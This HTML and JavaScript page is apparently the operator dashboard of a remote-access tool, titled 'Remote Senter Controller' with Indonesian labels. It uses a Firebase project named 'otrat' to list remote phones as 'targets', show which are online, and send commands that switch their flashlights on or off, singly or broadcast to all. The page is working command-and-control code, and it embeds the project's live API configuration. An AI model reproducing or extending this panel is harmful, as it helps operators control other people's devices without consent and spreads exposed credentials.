<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remote Senter Controller</title>
    <link rel="manifest" href="/manifest.json">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Courier New', monospace;
        }
        body {
            background: #0a0a0a;
            color: #00ff00;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        h1 {
            text-align: center;
            margin-bottom: 20px;
            border-bottom: 2px solid #00ff00;
            padding-bottom: 10px;
            font-size: 24px;
        }
        .stats {
            background: #111;
            border: 1px solid #00ff00;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        .manual-control {
            background: #111;
            border: 1px solid #ff00ff;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        .manual-control input {
            width: 100%;
            padding: 12px;
            background: #222;
            border: 1px solid #00ff00;
            color: #00ff00;
            font-family: monospace;
            font-size: 16px;
            margin: 10px 0;
            border-radius: 5px;
        }
        .manual-control button {
            background: #00ff00;
            color: black;
            border: none;
            padding: 12px 20px;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
            margin: 5px;
            width: calc(50% - 12px);
        }
        .manual-control button.off {
            background: #ff0000;
            color: white;
        }
        .target-list {
            background: #111;
            border: 1px solid #00ff00;
            padding: 15px;
            border-radius: 5px;
        }
        .target-item {
            border: 1px solid #333;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
            background: #1a1a1a;
        }
        .target-id {
            color: #00ff00;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
        }
        .target-time {
            color: #ffff00;
            font-size: 12px;
        }
        .flash-status {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 3px;
            font-size: 12px;
            margin: 5px 0;
        }
        .status-on {
            background: #00ff00;
            color: black;
        }
        .status-off {
            background: #333;
            color: #ccc;
        }
        .controls {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
        .controls button {
            background: #00ff00;
            color: black;
            border: none;
            padding: 10px;
            border-radius: 3px;
            font-weight: bold;
            cursor: pointer;
            flex: 1;
        }
        .controls button.off {
            background: #ff0000;
            color: white;
        }
        .broadcast {
            margin-top: 20px;
            padding: 20px;
            background: #111;
            border: 1px solid #ff00ff;
            border-radius: 5px;
        }
        .broadcast-btn {
            background: #ff00ff;
            color: white;
            font-size: 16px;
            padding: 15px;
            width: 100%;
            margin: 5px 0;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .footer {
            margin-top: 30px;
            text-align: center;
            color: #666;
            font-size: 12px;
        }
    </style>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body>
    <div class="container">
        <h1>
            🔦 REMOTE SENTER CONTROLLER
            <span>© Architect 02</span>
        </h1>
        
        <div class="stats">
            📊 Target Online: <span id="onlineCount">0</span>
        </div>
        
        <div class="manual-control">
            <h3>🎮 KONTROL MANUAL</h3>
            <input type="text" id="manualTargetId" placeholder="Masukkan ID Target">
            <div>
                <button onclick="manualControl('on')">🔦 NYALAIN</button>
                <button class="off" onclick="manualControl('off')">⚫ MATIIN</button>
            </div>
        </div>
        
        <div class="target-list">
            <h3>🎯 DAFTAR TARGET:</h3>
            <div id="targets">
                <p style="color: #666;">Menunggu target...</p>
            </div>
        </div>
        
        <div class="broadcast">
            <h3>📢 BROADCAST</h3>
            <button class="broadcast-btn" onclick="broadcastTorch('on')">
                🔦 NYALAIN SEMUA
            </button>
            <button class="broadcast-btn" style="background:#ff0000;" onclick="broadcastTorch('off')">
                ⚫ MATIIN SEMUA
            </button>
        </div>
        
        <div class="footer">
            ⚡ REAL-TIME CONTROL
        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCoC-uCqyiuE_jrJlVbRXrqlNsqiRrTLHU",
            authDomain: "otrat-27a09.firebaseapp.com",
            databaseURL: "https://otrat-27a09-default-rtdb.firebaseio.com",
            projectId: "otrat-27a09",
            storageBucket: "otrat-27a09.firebasestorage.app",
            messagingSenderId: "414699965939",
            appId: "1:414699965939:web:8625a69791a8d839021686"
        };
        
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        
        const targetsRef = database.ref('targets');
        
        targetsRef.on('value', (snapshot) => {
            const targets = snapshot.val();
            const targetsDiv = document.getElementById('targets');
            const onlineCount = document.getElementById('onlineCount');
            
            if (!targets) {
                targetsDiv.innerHTML = '<p style="color: #666;">Belum ada target...</p>';
                onlineCount.innerText = '0';
                return;
            }
            
            let html = '';
            let online = 0;
            const now = Date.now();
            
            Object.keys(targets).forEach(key => {
                const target = targets[key];
                const lastSeen = target.lastSeen || target.timestamp || 0;
                const isOnline = (now - lastSeen) < 120000;
                
                if (isOnline) online++;
                
                const statusClass = target.flashlight === 'on' ? 'status-on' : 'status-off';
                
                html += `
                    <div class="target-item">
                        <div class="target-id" onclick="fillTargetId('${key}')">📱 ${key}</div>
                        <div class="target-time">
                            ${isOnline ? '🟢 ONLINE' : '🔴 OFFLINE'} | 
                            Last: ${new Date(lastSeen).toLocaleTimeString()}
                        </div>
                        <div>
                            <span class="flash-status ${statusClass}">
                                🔦 SENTER: ${target.flashlight || 'OFF'}
                            </span>
                        </div>
                        <div class="controls">
                            <button onclick="sendCommand('${key}', 'on')">NYALAIN</button>
                            <button class="off" onclick="sendCommand('${key}', 'off')">MATIIN</button>
                        </div>
                    </div>
                `;
            });
            
            targetsDiv.innerHTML = html;
            onlineCount.innerText = online;
        });
        
        function sendCommand(targetId, state) {
            database.ref('commands/' + targetId).set({
                torch: state,
                timestamp: Date.now()
            });
            alert('✅ Command dikirim ke ' + targetId);
        }
        
        function manualControl(state) {
            const targetId = document.getElementById('manualTargetId').value.trim();
            if (!targetId) {
                alert('❌ Masukkan ID target!');
                return;
            }
            sendCommand(targetId, state);
        }
        
        function fillTargetId(id) {
            document.getElementById('manualTargetId').value = id;
        }
        
        function broadcastTorch(state) {
            if (!confirm(`Yakin mau ${state === 'on' ? 'NYALAIN' : 'MATIIN'} SEMUA target?`)) return;
            
            targetsRef.once('value', (snapshot) => {
                const targets = snapshot.val();
                let count = 0;
                const now = Date.now();
                
                Object.keys(targets).forEach(key => {
                    const lastSeen = targets[key].lastSeen || targets[key].timestamp || 0;
                    if ((now - lastSeen) < 120000) {
                        database.ref('commands/' + key).set({
                            torch: state,
                            timestamp: now
                        });
                        count++;
                    }
                });
                
                alert(`✅ Broadcast ke ${count} target`);
            });
        }
    </script>
</body>
</html>
